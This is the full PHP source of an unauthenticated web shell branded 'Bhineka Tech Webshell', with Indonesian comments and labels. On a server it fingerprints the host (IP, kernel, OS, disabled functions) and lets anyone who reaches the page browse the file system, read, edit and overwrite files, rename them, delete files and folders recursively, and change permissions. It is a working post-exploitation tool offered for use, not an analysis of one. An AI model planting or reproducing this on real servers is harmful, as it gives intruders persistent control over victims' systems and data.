<?php

//Author by Ibrahim - Bhineka Tech
error_reporting(0);

function info() {
  $arr = [
    'ip' => $_SERVER['REMOTE_ADDR'],
    'host' => gethostname(),
    'kernel' => php_uname(),
    'disablefunc' => ini_get('disable_functions'),
    'path' => getcwd(),
    'os' => PHP_OS,
  ];  

  return $arr;
} 
$getInfo = info();

if(strtoupper(substr($getInfo['os'], 0, 3)) == 'WIN') {
  $getInfo['os'] = 'Windows';
}else if(strtoupper(substr($getInfo['os'], 0, 3)) == 'LIN') {
  $getInfo['os'] = 'Linux';
}


$dir = getcwd();
$replace = str_replace('\\', '/', $dir);
$pecah = explode('/', $replace);

function setPath($list) {
	$dir = "";
	for($i=0; $i < count($list); $i++) {
		for($j=0; $j < $i; $j++) {
			$dir .= $list[$j] . '/';
		}

		$dir .= $list[$i] . ' ';
   }

   $dirArr = explode(' ', $dir);
   return $dirArr;
}

function cekPermission($filenya) {

  $perms = fileperms($filenya);
  switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = '-';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: 
        $info = 'u';
}

      //Untuk Owner
      $info .= (($perms & 0x0100) ? 'r' : '-');
      $info .= (($perms & 0x0080) ? 'w' : '-');
      $info .= (($perms & 0x0040) ?
                  (($perms & 0x0800) ? 's' : 'x' ) :
                  (($perms & 0x0800) ? 'S' : '-'));

      //Untuk Group
      $info .= (($perms & 0x0020) ? 'r' : '-');
      $info .= (($perms & 0x0010) ? 'w' : '-');
      $info .= (($perms & 0x0008) ?
                  (($perms & 0x0400) ? 's' : 'x' ) :
                  (($perms & 0x0400) ? 'S' : '-'));

      //Untuk Other
      $info .= (($perms & 0x0004) ? 'r' : '-');
      $info .= (($perms & 0x0002) ? 'w' : '-');
      $info .= (($perms & 0x0001) ?
                  (($perms & 0x0200) ? 't' : 'x' ) :
                  (($perms & 0x0200) ? 'T' : '-'));

      return $info;
}

function hitungSize($fileSize) {
	$bytes = sprintf('%u', filesize($fileSize));

    if ($bytes > 0)
    {
        $unit = intval(log($bytes, 1024));
        $units = array('B', 'KB', 'MB', 'GB');

        if (array_key_exists($unit, $units) === true)
        {
            return sprintf('%d %s', $bytes / pow(1024, $unit), $units[$unit]);
        }
    }

    return $bytes;
}

function bungkus($obj) {
	$wrap = filter_var(htmlspecialchars(file_get_contents($obj)), FILTER_SANITIZE_STRING);
	return $wrap;
}

function deleteFolder($dirnya) {
	$files = array_diff(scandir($dirnya), array('.', '..')); 

    foreach ($files as $file) { 
        (is_dir("$dirnya/$file")) ? deleteFolder("$dirnya/$file") : unlink("$dirnya/$file"); 
    }

    return rmdir($dirnya);
}


$pecahLagi = setPath($pecah);

if(isset($_GET['path'])) {
	$get = $_GET['path'];
	$pec = explode('/', $get);

	$getPath = setPath($pec);

	if(is_file($get)) {
		$konten = bungkus($get);
		$cek = true;
	}

	$listDir = scandir($get);
}else {	
	$get = $replace;
	$listDir = scandir($get);
}

if(isset($_POST['pilihan'])) {
	switch ($_POST['pilihan']) {
		case $_POST['pilihan'] == 'edit':
			$edit = true;
			$dirFile = $_POST['dir'];
			$sourceFile = $_POST['sourceFile'];
			if(!empty($sourceFile)){
				if(file_put_contents($dirFile, $sourceFile)) {
					$successEdit = 'Berhasil di edit';
				}else {
					$successEdit = 'Gagal edit';					
				}
			}
			break;
		case $_POST['pilihan'] == 'rename':
			$rename = true;
			$dirFile = $_POST['dir'];
			$filename = $_POST['namaFile'];
			$namaBaru = $_POST['namaBaru'];
			if(!empty($namaBaru)){
				if(rename($dirFile, $namaBaru)) {
					$filename = $namaBaru;
					$successRename = 'Berhasil rename';
				}else {
					$successRename = 'Gagal rename';
				}
 			}
			break;
		case $_POST['pilihan'] == 'delete':
			$dirFile = $_POST['dir'];
			$type = $_POST['type'];
			if(isset($dirFile) && is_file($dirFile)) {
				if(unlink($dirFile)) {	
					$pesanHapus =  "<script>
									alert('File berhasil dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}else {
					$pesanHapus =  "<script>
									alert('File gagal dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}
			}else if(isset($dirFile) && is_dir($dirFile)) {
				//$dirFile = $dirFile . '/';
				if(deleteFolder($dirFile)) {
									$pesanHapus =  "<script>
									alert('Folder berhasil dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}else {
					$pesanHapus =  "<script>
									alert('Folder gagal dihapus!!');
									window.location.href = window.location.href;
								    </script>";
				}
			}
			break;
		case $_POST['pilihan'] == 'chmod':
			$chmod = true;
			$file = fileperms($_POST['dir']);
			$permission = substr(sprintf('%o', $file), -4);
			$dirFile = $_POST['dir'];
			$perms = $_POST['perms'];

			if(isset($perms)) {
				if(chmod($dirFile, $perms)) {
					$permission = $perms;
					$successChmod ='Berhasil chmod!';
				}else {
				    $successChmod = 'Gagal chmod!';
				}
			}
			break;
	}
}



?>

<!DOCTYPE html>
<html>
<head>
	<title>Webshell Bhineka Tech</title>
</head>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<style type="text/css">

.info {
	display: block;
}
	
table.striped > tbody > tr:nth-child(odd) {
	background-color: rgba(170, 213, 213, 0.5);
}
nav {
    background-color: #42a5f5;
}
.select-wrapper {
    position: relative;
    width: 100px;
    display: inline-block;
}
</style>
<body>
	<nav>
       <div class="container">
	    <div class="nav-wrapper">
	      <a href="#" class="brand-logo center">Bhineka Tech Webshell</a>
	    </div>
	   </div>
  	</nav>

  	<div class="container" style="margin-top: 30px;">
        <b class="info">IP : <?= $getInfo['ip']; ?></b>
        <b class="info">Hostname : <?= $getInfo['host']; ?></b>
        <b class="info">Kernel : <?= $getInfo['kernel']; ?></b>
        <b class="info">Disable Function : <?= empty($getInfo['disablefunc']) ? 'None :)  ' : $getInfo['disablefunc']; ?></b>
        <b class="info">OS : <?= $getInfo['os']; ?></b>
	PATH:
	<?php if(empty($_GET['path'])): $i = 0; foreach ($pecahLagi as $p) : ?>
		<a href="?path=<?= $p; ?>"><?= @$pecah[$i++]; ?></a>/
	<?php endforeach; else: $i = 0; foreach($getPath as $gets): ?> 
		<a href="?path=<?= $gets; ?>"><?= @$pec[$i++]; ?></a>/
	<?php endforeach; endif; ?>
	</div>

	<?php if($cek){ ?>

<textarea cols="80" rows="20" disabled="">
<?= $konten; ?>
</textarea>
	<?php }else if($edit){ ?>
<?= !empty($successEdit) ? $successEdit : ""; ?>
<form method="POST">
<input type="hidden" name="dir" value="<?= $dirFile; ?>">
<input type="hidden" name="pilihan" value="edit">
<textarea cols="80" rows="20" name="sourceFile">
<?= bungkus($dirFile); ?>
</textarea>
<br>
<button type="submit">Update!!</button>
</form>
	<?php }else if($rename){ ?>
		<?= !empty($successRename) ? $successRename : ""; ?>
		<form method="POST">
			<input type="hidden" name="dir" value="<?= $dirFile; ?>">
			<input type="hidden" name="pilihan" value="rename">
			<input type="text" name="namaBaru" value="<?= $filename; ?>">
			<button type="submit">Rename</button>
		</form>
	<?php }else if($chmod) { ?>
		<?= !empty($successChmod) ? $successChmod : ''; ?>
		<form method="POST">
			<input type="hidden" name="dir" value="<?= $dirFile; ?>">
			<input type="hidden" name="pilihan" value="chmod">
			<input type="text" name="perms" value="<?= $permission; ?>">
			<button type="submit">Chmod</button>
		</form>
	<?php }else{ ?>
   <div class="container">	
	<table class="striped centered bordered">
		<?= !empty($pesanHapus) ? $pesanHapus : ''; ?>
		<thead>	
		<tr>
			<th>Nama</th>
			<th>Size</th>
			<th>Permission</th>
			<th>Action</th>
		</tr>
		</thead>
		<?php foreach($listDir as $dir): ?>
		<tr>
			<td><a style="color: black;" href="?path=<?= $get . '/' . $dir; ?>"><?= $dir; ?></a></td>
			<td><?= is_file($get . '/' . $dir) ? hitungSize($get . '/' . $dir) : 'Folders'; ?></td>
			<td><?= is_writable($get . '/' . $dir) ? '<font color="green">' . @cekPermission($get . '/' . $dir) . '</font>' : '<font color="red">' . @cekPermission($get . '/' . $dir) . '</font>';?></td>
			<td>
				<?php if(is_file($get . '/' . $dir)): ?>
				<form method="POST" action="?set&path=<?= $get; ?>">	
					<select name="pilihan" style="height: 100px;">
						<option value="Select" disabled selected>Pilih</option>
						<option value="rename">Rename</option>
						<option value="edit">Edit</option>
						<option value="delete">Delete</option>
						<option value="chmod">Chmod</option>
					</select>
					<input type="hidden" name="type" value="file">
					<input type="hidden" name="namaFile" value="<?= $dir; ?>">
					<input type="hidden" name="dir" value="<?= $get . '/' . $dir ?>">
					 <button class="btn waves-effect waves-light" type="submit" name="action">
					    <i class="material-icons right">send</i>
					 </button>
				</form>
				<?php else: ?>
				<form method="POST" action="?set&path=<?= $get; ?>">	
					<select name="pilihan">
						<option value="Select" disabled selected>Pilih</option>
						<option value="rename">Rename</option>
						<option value="delete">Delete</option>
						<option value="chmod">Chmod</option>
					</select>
					<input type="hidden" name="type" value="folder">
					<input type="hidden" name="namaFile" value="<?= $dir; ?>">
					<input type="hidden" name="dir" value="<?= $get . '/' . $dir ?>">
					<button class="btn waves-effect waves-light" type="submit" name="action">
					    <i class="material-icons right">send</i>
					</button>
				</form>
				<?php endif; ?>
			</td>
		</tr>
		<?php endforeach; ?>
	</table>
</div>
	<?php } ?>

<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
<script>
	document.addEventListener('DOMContentLoaded', function() {
    var elems = document.querySelectorAll('select');
    var instances = M.FormSelect.init(elems, {});
  });
</script>
</body>
</html>